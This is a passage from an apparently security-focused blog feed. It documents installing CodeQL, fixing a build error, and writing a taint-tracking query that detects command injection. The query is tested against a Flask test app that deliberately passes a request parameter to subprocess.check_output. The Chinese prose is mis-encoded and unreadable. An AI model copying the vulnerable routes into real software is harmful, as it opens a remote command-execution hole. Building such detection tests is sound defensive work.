·çš„ç›®çš„å¯ä»¥ç”±ä¸€ä¸‡ç§ä¸åŒçš„æ–¹å¼è¾¾æˆ. æ„Ÿè§‰å¯¹æ–°æ‰‹ç¡®å®ä¸å¤ªå‹å¥½. ç­‰åç»­æ–‡æ¡£è·Ÿä¸Šå§.  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;é¦–å…ˆéœ€è¦è§£å†³çš„å°±æ˜¯ä¸Šæ¬¡ç•™ä¸‹çš„é—®é¢˜, æ·»åŠ è‡ªå®šä¹‰çš„ taint track.&lt;br&gt;åœ¨è‡ªå¸¦çš„ tests ä¸­å°±æœ‰ç¤ºä¾‹, å¯ä»¥å‚è€ƒ &lt;code&gt;ql/python/ql/test/library-tests/taint/extensions/ExtensionsLib.qll&lt;/code&gt;  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="codeql" scheme="https://rmb122.com/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>Codeql è¸©å‘è®°å½•</title>
    <link href="https://rmb122.com/2020/03/30/Codeql-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
    <id>https://rmb122.com/2020/03/30/Codeql-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</id>
    <published>2020-03-30T15:24:40.000Z</published>
    <updated>2020-05-29T10:57:53.734Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>å…¥å£: <a href="https://help.semmle.com/codeql/codeql-cli/procedures/get-started.html" target="_blank" rel="noopener">https://help.semmle.com/codeql/codeql-cli/procedures/get-started.html</a><br>ä¸‹è½½åœ°å€: <a href="https://github.com/github/codeql-cli-binaries/releases" target="_blank" rel="noopener">https://github.com/github/codeql-cli-binaries/releases</a><br>license: <a href="https://securitylab.github.com/tools/codeql/license" target="_blank" rel="noopener">https://securitylab.github.com/tools/codeql/license</a>  </p><a id="more"></a><p>license é‡Œé¢æœ‰å†™:  </p><p>Further, except (and only to the extent) permitted by applicable law or applicable third-party license, you will not (and have no right to):</p><p>work around any technical limitations in the Software that only allow you to use it in certain ways;<br><strong>reverse engineer</strong>, decompile or disassemble the Software;<br>remove, minimize, block, or modify any notices of GitHub or its suppliers in the Software;<br>use the Software in any way that is against the law; or<br>share, publish, distribute or lend the Software, provide or make available the Software as a hosted solution (whether on a standalone basis or combined, incorporated or integrated with other software or services) for others to use, or transfer the Software or these Terms to any third party.</p><p>GitHub CodeQL can only be used on codebases that are released under an OSI-approved open source license, or to perform academic research. It canâ€™t be used to generate CodeQL databases for or during automated analysis, continuous integration or continuous delivery, whether as part of normal software engineering processes or otherwise. For these uses, contact the sales team.</p><p>å¤§æ¦‚æ„æ€å°±æ˜¯: ä¸»ç¨‹åºæ˜¯é—­æºçš„, ä½†æ˜¯æ£€æµ‹è§„åˆ™æ˜¯å¼€æºçš„, å…¶ä¸­ä¸€äº› <a href="https://github.com/github/codeql-go" target="_blank" rel="noopener">extractor</a> ä¹Ÿå¼€æºäº†, å½“ç„¶å…¶å® java å†™çš„æœªæ··æ·†, è·Ÿå¼€æºå·®ä¸å¤š.<br>ç”¨äºå­¦æœ¯ç ”ç©¶æˆ–è€…æ£€æµ‹å¼€æºé¡¹ç›®éƒ½éšä¾¿ä½¿ç”¨, ä½†æ˜¯æ‹¿æ¥å•†ä¸šç­‰æ“ä½œ, å°±éœ€è¦è´­ä¹°å•†ä¸š license.  </p><p>ä¸»ç¨‹åºå°±åœ¨ tools/codeql.jar, ä¹Ÿæ²¡åšæ··æ·†å•¥çš„. è¿˜æ˜¯æŒºè‰¯å¿ƒçš„.<br>å®‰è£…åŒ…é‡Œé¢è‡ªå¸¦äº†è¿è¡Œç¯å¢ƒå’Œæ”¯æŒè¯­è¨€çš„ extractor (ç”šè‡³è‡ªå¸¦ java è¿è¡Œç¯å¢ƒ), å¼€ç®±å³ç”¨.  </p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>å…ˆå†™ä¸ªæµ‹è¯•ç”¨ä¾‹çœ‹çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># $ cat flask-example/app.py</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>))</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>å»ºç«‹ database  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/rmb122/repos/codeql/codeql database create codeql-database --language=python --<span class="built_in">source</span>-root flask-example</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å–œé—»ä¹è§çš„å‡ºé”™äº† 233</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[2020-03-30 17:45:00] [build] [INFO] [8] Extracted module _lzma in 22ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [3] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;backends&#x2F;openssl&#x2F;dsa.py in 765ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [5] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;primitives&#x2F;serialization&#x2F;ssh.py in 404ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [1] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;backends&#x2F;openssl&#x2F;encode_asn1.py in 1572ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [ERROR] [1] Failed to extract module _decimal: libmpdec.so.2: cannot open shared object file: No such file or directory</span><br><span class="line">[2020-03-30 17:45:01] [build] [TRACEBACK] [1] &quot;semmle&#x2F;worker.py&quot;, line 220, in _extract_loop</span><br><span class="line">[2020-03-30 17:45:01] [build] [TRACEBACK] [1] &quot;semmle&#x2F;extractors&#x2F;super_extractor.py&quot;, line 47, in process</span><br><span class="line">[2020-03-30 17:45:01] [build] [TRACEBACK] [1] &quot;semmle&#x2F;extractors&#x2F;builtin_extractor.py&quot;, line 14, in process</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [5] Extracted module _io in 50ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [8] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;primitives&#x2F;asymmetric&#x2F;dh.py in 373ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [1] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;werkzeug&#x2F;wrappers&#x2F;cors.py in 85ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [7] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;argparse.py in 5850ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [2] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;tarfile.py in 5602ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [3] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;werkzeug&#x2F;debug&#x2F;repr.py in 611ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [4] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;jinja2&#x2F;parser.py in 2626ms</span><br><span class="line">[2020-03-30 17:45:03] [build] [ERROR] Process 6 timed out</span><br><span class="line">[2020-03-30 17:45:04] [build-err] Traceback (most recent call last):</span><br><span class="line">[2020-03-30 17:45:04] [build-err]   File &quot;&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;index.py&quot;, line 19, in &lt;module&gt;</span><br><span class="line">[2020-03-30 17:45:04] [build-err]     buildtools.index.main()</span><br><span class="line">[2020-03-30 17:45:04] [build-err]   File &quot;&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;python3src.zip&#x2F;buildtools&#x2F;index.py&quot;, line 110, in main</span><br><span class="line">[2020-03-30 17:45:04] [build-err]   File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;subprocess.py&quot;, line 364, in check_call</span><br><span class="line">[2020-03-30 17:45:04] [build-err]     raise CalledProcessError(retcode, cmd)</span><br><span class="line">[2020-03-30 17:45:04] [build-err] subprocess.CalledProcessError: Command &#39;[&#39;python3&#39;, &#39;-S&#39;, &#39;&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;python_tracer.py&#39;, &#39;-v&#39;, &#39;-z&#39;, &#39;all&#39;, &#39;-c&#39;, &#39;&#x2F;home&#x2F;rmb122&#x2F;temp&#x2F;codeql&#x2F;codeql-database&#x2F;working&#x2F;trap_cache&#39;, &#39;-p&#39;, &#39;&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#39;, &#39;-R&#39;, &#39;&#x2F;home&#x2F;rmb122&#x2F;temp&#x2F;codeql&#x2F;flask-example&#39;]&#39; returned non-zero exit status 1.</span><br><span class="line">[2020-03-30 17:45:04] [ERROR] Spawned process exited abnormally (code 1; tried to run: [&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;autobuild.sh])</span><br><span class="line">A fatal error occurred: Exit status 1 from command: [&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;autobuild.sh]</span><br></pre></td></tr></table></figure><p>é—®é¢˜å‡ºåœ¨è¿™<br>Failed to extract module _decimal: libmpdec.so.2: cannot open shared object file: No such file or directory  </p><p>repl é‡Œé¢è¿è¡Œä¸€ä¸‹, æœç„¶ä¹Ÿæ˜¯å¦‚æ­¤  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line">Python 3.8.2 (default, Feb 26 2020, 22:21:03) </span><br><span class="line">[GCC 9.2.1 20200130] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import _decimal</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">ImportError: libmpdec.so.2: cannot open shared object file: No such file or directory</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ç¥å¥‡çš„å±…ç„¶æ²¡æœ‰è£…, pacman -S mpdecimal è£…ä¸€ä¸ªå°±å®Œäº‹äº†.<br>è¿™åº”è¯¥åªæ‰«äº†ç”¨åˆ°çš„åº“, æ²¡æœ‰æ‰«å…¨éƒ¨çš„åº“, æŒºå¿«çš„, ç‚¹ä¸ªèµ.  </p><p>æ¥ä¸‹æ¥çœŸæ­£å¼€å§‹å†™ ql<br>æ•™ç¨‹åœ¨è¿™:<br><a href="https://help.semmle.com/QL/learn-ql/" target="_blank" rel="noopener">https://help.semmle.com/QL/learn-ql/</a><br><a href="https://help.semmle.com/QL/ql-handbook/" target="_blank" rel="noopener">https://help.semmle.com/QL/ql-handbook/</a><br><a href="https://help.semmle.com/qldoc/" target="_blank" rel="noopener">https://help.semmle.com/qldoc/</a>  </p><p>å®˜æ–¹çš„è§„åˆ™åº“:<br><a href="https://github.com/Semmle/ql.git" target="_blank" rel="noopener">https://github.com/Semmle/ql.git</a><br>å­¦ä¹ ä¸€å“ˆ.  </p><p>å®˜æ–¹è‡ªå¸¦çš„ ql é‡Œé¢æœ‰é¢„å…ˆå®šä¹‰å¥½ä¸€äº›æ•°æ®ç»“æ„, ç›´æ¥ import python å°±èƒ½ç”¨äº†, .qll æ˜¯ library, .ql æ˜¯çœŸæ­£çš„æŸ¥è¯¢è¯­å¥.<br>æ­£å¼è¿è¡Œè¿˜éœ€è¦å®šä¹‰ä¸€ä¸ª qlpack.yml, æ„ä¹‰è·Ÿ pom.xml å·®ä¸å¤šå§, å®šä¹‰åŒ…åå’Œä¾èµ–<br><a href="https://help.semmle.com/codeql/codeql-cli/reference/qlpack-overview.html" target="_blank" rel="noopener">https://help.semmle.com/codeql/codeql-cli/reference/qlpack-overview.html</a>  </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">com-rmb122-test</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">0.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">libraryPathDependencies:</span> <span class="string">codeql-python</span></span><br><span class="line"><span class="attr">extractor:</span> <span class="string">python</span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>$HOME/.config/codeql/config</code> é‡Œé¢è®¾ç½® ql repo çš„è·¯å¾„, è¿™æ ·æ‰èƒ½è¢« import, æ„Ÿè§‰ç°åœ¨è¿™ç§æ‰‹åŠ¨é…ç½®å¥½è›‹ç—› =.= æ„Ÿè§‰è·Ÿè‡ªå·±ç¼–è¯‘ cpp ä¸€æ ·é“¾æ¥ä¸€å †åº“<br>è€Œä¸”æ–‡æ¡£ u1s1, æŒºä¹±çš„, ä¸è¿‡åˆšè¢« github æ”¶è´­, å¯ä»¥ç†è§£, å¸Œæœ›ä¹‹åèƒ½æ›´æ–¹ä¾¿ä¸€ç‚¹.  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--search-path &lt;path to ql repo&gt;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸è¦å†™æˆ <code>--search-path=&lt;path to ql repo&gt;</code>, ä¸ç„¶è¯†åˆ«ä¸äº†â€¦ å‘äº†æˆ‘å¥½ä¹….  </p><p>ç„¶åä¿å­˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import python</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName().matches(&quot;index&quot;)</span><br><span class="line">select f, &quot;This is a function called get...&quot;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/rmb122/repos/codeql/codeql query run test.ql -d ../codeql-database/</span><br></pre></td></tr></table></figure><p>å°±èƒ½è¿è¡Œäº†, æˆ–è€…ç”¨ vscode æ’ä»¶ä¹Ÿè¡Œ, æ›´æ–¹ä¾¿ä¸€ç‚¹. å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬å†™çš„ index å‡½æ•°.  </p><h2 id="ç®€å•çš„-Taint-demo"><a href="#ç®€å•çš„-Taint-demo" class="headerlink" title="ç®€å•çš„ Taint demo"></a>ç®€å•çš„ Taint demo</h2><p>ç…§ç€è‡ªå¸¦çš„ç¤ºä¾‹, å¯ä»¥ä¾è‘«èŠ¦ç”»ç“¢, å†™å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import python</span><br><span class="line">import semmle.python.security.TaintTracking</span><br><span class="line">import semmle.python.web.flask.Request</span><br><span class="line"></span><br><span class="line">class SystemCommandExecution extends TaintTracking::Configuration &#123;</span><br><span class="line">    SystemCommandExecution() &#123; this &#x3D; &quot;SystemCommandExecution Tracking&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src, TaintKind kind) &#123;</span><br><span class="line">        exists(FlaskRequestArgs taintSrc |</span><br><span class="line">            src.asCfgNode() &#x3D; taintSrc </span><br><span class="line">            &#x2F;&#x2F; and taintSrc.isSourceOf(kind) è¿™é‡Œç¤ºä¾‹ç”¨çš„ get, ä¸æ˜¯ dickstring è¿™ä¸ª kind, æ‰€ä»¥éœ€è¦æ³¨é‡Šæ‰</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink, TaintKind kind) &#123;</span><br><span class="line">        exists(</span><br><span class="line">            CallNode call |</span><br><span class="line">            call.getFunction().pointsTo(Value::named(&quot;subprocess.check_output&quot;)) and</span><br><span class="line">            call.getArg(0) &#x3D; sink.asCfgNode()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from SystemCommandExecution config, DataFlow::Node src, DataFlow::Node sink</span><br><span class="line">where config.hasSimpleFlow(src, sink)</span><br><span class="line">select sink, src</span><br></pre></td></tr></table></figure><p>å†æ£€æµ‹ä¸€ä¸‹å¨åŠ›åŠ å¼ºç‰ˆç¤ºä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index2')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index2</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index3')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index3</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index4')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index4</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index5')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index5</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index6</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index7')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index7</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯ index, index5-7 éƒ½èƒ½æ£€æµ‹å‡ºæ¥, 2-4 æ²¡æ£€æµ‹å‡ºæ¥. åŸå› åº”è¯¥æ˜¯ spilt çš„ç»“æœæ²¡è¢« taint åˆ°.<br>å°† isSink æ›¿æ¢æˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink, TaintKind kind) &#123;</span><br><span class="line">        &quot;1&quot; &#x3D; &quot;1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è§‚å¯Ÿåˆ° <code>tmp = tmp.split(&#39;|&#39;)</code> çš„è¿”å›å€¼æ˜¯æ²¡è¢« select åˆ°çš„. ä¹Ÿå¯ä»¥éªŒè¯è¿™ä¸€ç‚¹.  </p><p>è¿™æ ·æµ‹è¯•ä¸‹æ¥, æ„Ÿè§‰æœ€å¤§çš„é—®é¢˜è¿˜æ˜¯ç¼–å†™èµ·æ¥æµ‹è¯•å¤ªè´¹åŠ²äº†, å°±ç®—åªæ›´æ”¹ä¸€ç‚¹å†…å®¹, ç¼–è¯‘å’Œè¿è¡Œéƒ½è¦ 1~2 åˆ†é’Ÿæ‰èƒ½å®Œæˆ. å¯¹ database ä¹Ÿæ˜¯åŒç†, åªèƒ½é‡æ–°ç”Ÿæˆ, æ²¡æœ‰æ›´æ–°çš„é€‰é¡¹, æµªè´¹äº†å¤§é‡çš„æ—¶é—´.<br>å‰©ä¸‹çš„å¯èƒ½æ˜¯è‡ªå¸¦çš„ taint tracking ä¸å¤Ÿç»™åŠ›, è¿˜å¥½å®˜æ–¹ç»™äº†ç›¸å…³çš„æ¥å£ (DataFlowExtension), éœ€è¦è‡ªå·±ç ”ç©¶ä¸‹æ·»åŠ é¢å¤– taint çš„æ–¹æ³•, è‡³å°‘ split è‚¯å®šæ˜¯å¾—åŠ è¿›å»çš„å§.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å®‰è£…&quot;&gt;&lt;a href=&quot;#å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…&quot;&gt;&lt;/a&gt;å®‰è£…&lt;/h2&gt;&lt;p&gt;å…¥å£: &lt;a href=&quot;https://help.semmle.com/codeql/codeql-cli/procedures/get-started.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://help.semmle.com/codeql/codeql-cli/procedures/get-started.html&lt;/a&gt;&lt;br&gt;ä¸‹è½½åœ°å€: &lt;a href=&quot;https://github.com/github/codeql-cli-binaries/releases&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/github/codeql-cli-binaries/releases&lt;/a&gt;&lt;br&gt;license: &lt;a href=&quot;https://securitylab.github.com/tools/codeql/license&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://securitylab.github.com/tools/codeql/license&lt;/a&gt;  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="codeql" scheme="https://rmb122.com/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>JEP-290 ç›¸å…³å­¦ä¹ </title>
    <link href="https://rmb122.com/2020/03/22/JEP-290-%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
    <id>https://rmb122.com/2020/03/22/JEP-290-%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-03-22T08:09:59.000Z</published>
    <updated>2020-05-29T04:34:37.672Z</updated>
    
    <content type="html"><![CDATA[<p>å®˜ç½‘ä»‹ç»: <a href="https://openjdk.java.net/jeps/290" target="_blank" rel="noopener">https://openjdk.java.net/jeps/290</a>  </p><p>JEP = JDK Enhancement Proposals<br>å°±æ˜¯ç­‰äºæ”¹è¿›ææ¡ˆ.  python ä¹Ÿæœ‰ç±»ä¼¼çš„, å°±æ˜¯å¤§å®¶å–œé—»ä¹è§çš„ PEP (Python Enhancement Proposals).  </p><a id="more"></a><p>åœ¨è¿™ä¸ª 290 é‡Œé¢, å¹²çš„äº‹æƒ…å°±æ˜¯æ–°å¢ä¸€ä¸ªè‡ªå¸¦çš„ååºåˆ—åŒ–è¿‡æ»¤å™¨.  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Security guidelines consistently require that input from external sources be validated before use. The filter mechanism will allow object-serialization clients to more easily validate their inputs, and exported RMI objects to validate invocation arguments.</span><br></pre></td></tr></table></figure><p>jdk æºç é‡Œé¢å¯ä»¥çœ‹åˆ°  </p><p>src/java.rmi/share/classes/sun/rmi/registry/RegistryImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 